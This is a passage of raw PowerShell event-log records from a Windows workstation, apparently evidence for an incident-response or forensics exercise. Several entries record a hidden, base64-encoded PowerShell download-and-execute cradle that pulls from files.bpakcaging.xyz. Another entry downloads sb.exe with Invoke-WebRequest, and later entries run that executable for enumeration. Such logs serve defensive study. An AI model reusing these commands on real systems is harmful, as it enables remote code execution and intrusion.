{
  "Timestamp": "2023-01-13 17:15:49.921093Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 619,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": ".\\sb.exe -group=all;pwd",
  "ScriptBlockId": "5d01c4da-05b7-47df-ace8-6ee2f2c8195e",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:15:27.811284Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 618,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.OriginInfo }",
  "ScriptBlockId": "a00ba71a-e31d-494e-ad68-12fa3511a684",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:15:27.810055Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 617,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }",
  "ScriptBlockId": "7804a76d-764a-4634-a129-086271a5d309",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:15:27.808679Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 616,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }",
  "ScriptBlockId": "84342a03-ebd3-47ee-8eca-8f4237b62979",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:15:27.803213Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 615,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.PSMessageDetails }",
  "ScriptBlockId": "e7c3c90a-f92d-411c-959f-af202d6ae3f6",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:15:27.731895Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4100,
  "RecordID": 614,
  "Level": "Warning",
  "Descr": "<Payload> Context: <ContextInfo>",
  "ContextInfo": "        Severity = Warning\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.145\n        Host ID = b9a32c0b-536a-40bf-8c7b-d00f4c7e33b8\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==\n        Engine Version = 5.1.18362.145\n        Runspace ID = 813f1b7e-a346-4b82-92ba-5b513e0295c5\n        Pipeline ID = 1\n        Command Name = Invoke-WebRequest\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 299\n        User = QL-WKSTN-5693\\j.westcott\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n",
  "UserData": null,
  "Payload": "Error Message = The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. \nFully Qualified Error ID = WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n"
}
{
  "Timestamp": "2023-01-13 17:15:27.092955Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 613,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": ".\\sb.exe;pwd",
  "ScriptBlockId": "019cfd77-ddfd-4593-9de3-5a2f80e18449",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:15:21.518351Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 612,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.OriginInfo }",
  "ScriptBlockId": "e49913b4-1439-468a-9d53-49600ff7afb7",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:15:21.517192Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 611,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }",
  "ScriptBlockId": "668758a0-ccb5-465e-baf9-7cefa45b6920",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:15:21.515999Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 610,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }",
  "ScriptBlockId": "d58499c4-0694-4d53-8596-0f3cb51fdee4",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:15:21.511154Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 609,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.PSMessageDetails }",
  "ScriptBlockId": "97f40f39-7e15-4751-8d3a-4f2f70ae6af8",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:15:21.455322Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4100,
  "RecordID": 608,
  "Level": "Warning",
  "Descr": "<Payload> Context: <ContextInfo>",
  "ContextInfo": "        Severity = Warning\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.145\n        Host ID = b9a32c0b-536a-40bf-8c7b-d00f4c7e33b8\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==\n        Engine Version = 5.1.18362.145\n        Runspace ID = 813f1b7e-a346-4b82-92ba-5b513e0295c5\n        Pipeline ID = 1\n        Command Name = Invoke-WebRequest\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 284\n        User = QL-WKSTN-5693\\j.westcott\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n",
  "UserData": null,
  "Payload": "Error Message = The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. \nFully Qualified Error ID = WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n"
}
{
  "Timestamp": "2023-01-13 17:15:20.912833Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 607,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": ".\\sb.exe system;pwd",
  "ScriptBlockId": "a4ac7b6e-7f29-4a3f-8344-868381fcf932",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:15:07.067625Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 606,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.OriginInfo }",
  "ScriptBlockId": "4d4106cd-7401-4c9c-ac7c-cd4ce9bfedcf",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:15:07.066397Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 605,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }",
  "ScriptBlockId": "aa365e61-1cca-4bcc-9a05-19562956cf0d",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:15:07.065012Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 604,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }",
  "ScriptBlockId": "15f6cb2c-6ff3-403c-b609-72b42d501995",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:15:07.059466Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 603,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.PSMessageDetails }",
  "ScriptBlockId": "f49e8531-8e3c-4338-b5fc-71bb0897cf00",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:15:06.938392Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4100,
  "RecordID": 602,
  "Level": "Warning",
  "Descr": "<Payload> Context: <ContextInfo>",
  "ContextInfo": "        Severity = Warning\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.145\n        Host ID = b9a32c0b-536a-40bf-8c7b-d00f4c7e33b8\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==\n        Engine Version = 5.1.18362.145\n        Runspace ID = 813f1b7e-a346-4b82-92ba-5b513e0295c5\n        Pipeline ID = 1\n        Command Name = Invoke-WebRequest\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 269\n        User = QL-WKSTN-5693\\j.westcott\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n",
  "UserData": null,
  "Payload": "Error Message = The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. \nFully Qualified Error ID = WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n"
}
{
  "Timestamp": "2023-01-13 17:15:06.355560Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 601,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": ".\\sb.exe all;pwd",
  "ScriptBlockId": "4c455f3b-81ce-496b-b640-959917413a57",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:14:38.891059Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 600,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.OriginInfo }",
  "ScriptBlockId": "54b0117d-2c9f-47b2-a3ea-5df8d734b667",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:14:38.890041Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 599,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }",
  "ScriptBlockId": "c64c9695-39df-4790-91f8-e1a1a39bafff",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:14:38.888912Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 598,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }",
  "ScriptBlockId": "0d340566-3158-4a8c-ac95-a36642603186",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:14:38.884562Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 597,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.PSMessageDetails }",
  "ScriptBlockId": "e32101ee-2c4e-47da-a7ee-427481c5b9f5",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:14:38.830634Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4100,
  "RecordID": 596,
  "Level": "Warning",
  "Descr": "<Payload> Context: <ContextInfo>",
  "ContextInfo": "        Severity = Warning\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.145\n        Host ID = b9a32c0b-536a-40bf-8c7b-d00f4c7e33b8\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==\n        Engine Version = 5.1.18362.145\n        Runspace ID = 813f1b7e-a346-4b82-92ba-5b513e0295c5\n        Pipeline ID = 1\n        Command Name = Invoke-WebRequest\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 254\n        User = QL-WKSTN-5693\\j.westcott\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n",
  "UserData": null,
  "Payload": "Error Message = The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. \nFully Qualified Error ID = WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n"
}
{
  "Timestamp": "2023-01-13 17:14:35.674126Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 595,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.OriginInfo }",
  "ScriptBlockId": "a51de60a-9b53-41df-bf53-c9fa2205a003",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:14:35.672640Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 594,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }",
  "ScriptBlockId": "11d37fbf-914a-4dcc-8b6a-f1a8956201c0",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:14:35.671322Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 593,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }",
  "ScriptBlockId": "0e4cdba4-6635-44c6-84e1-34d86d064711",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:14:35.651024Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 592,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.PSMessageDetails }",
  "ScriptBlockId": "9e6279df-406b-4c6c-aa4f-d562c78d7f16",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:14:35.590845Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4100,
  "RecordID": 591,
  "Level": "Warning",
  "Descr": "<Payload> Context: <ContextInfo>",
  "ContextInfo": "        Severity = Warning\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.145\n        Host ID = b9a32c0b-536a-40bf-8c7b-d00f4c7e33b8\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==\n        Engine Version = 5.1.18362.145\n        Runspace ID = 813f1b7e-a346-4b82-92ba-5b513e0295c5\n        Pipeline ID = 1\n        Command Name = Invoke-WebRequest\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 239\n        User = QL-WKSTN-5693\\j.westcott\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n",
  "UserData": null,
  "Payload": "Error Message = The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. \nFully Qualified Error ID = WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n"
}
{
  "Timestamp": "2023-01-13 17:14:33.855233Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 590,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe;pwd",
  "ScriptBlockId": "52095c2f-e002-4cb8-b028-d434aeba1cee",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:56.096252Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 589,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.OriginInfo }",
  "ScriptBlockId": "87ee2cf9-7f39-4e7c-bb22-e1f00dd58116",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:56.095165Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 588,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }",
  "ScriptBlockId": "e7cd391a-488c-4a53-a596-5fb11cc03093",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:56.093812Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 587,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }",
  "ScriptBlockId": "80e31326-d64c-4e65-b403-f8aec1802f86",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:56.089316Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 586,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.PSMessageDetails }",
  "ScriptBlockId": "0e9aa952-c8e6-427c-bf28-7cac2eea5b14",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:56.019427Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4100,
  "RecordID": 585,
  "Level": "Warning",
  "Descr": "<Payload> Context: <ContextInfo>",
  "ContextInfo": "        Severity = Warning\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.145\n        Host ID = b9a32c0b-536a-40bf-8c7b-d00f4c7e33b8\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==\n        Engine Version = 5.1.18362.145\n        Runspace ID = 813f1b7e-a346-4b82-92ba-5b513e0295c5\n        Pipeline ID = 1\n        Command Name = Invoke-WebRequest\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 224\n        User = QL-WKSTN-5693\\j.westcott\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n",
  "UserData": null,
  "Payload": "Error Message = The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. \nFully Qualified Error ID = WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n"
}
{
  "Timestamp": "2023-01-13 17:13:54.256260Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 584,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
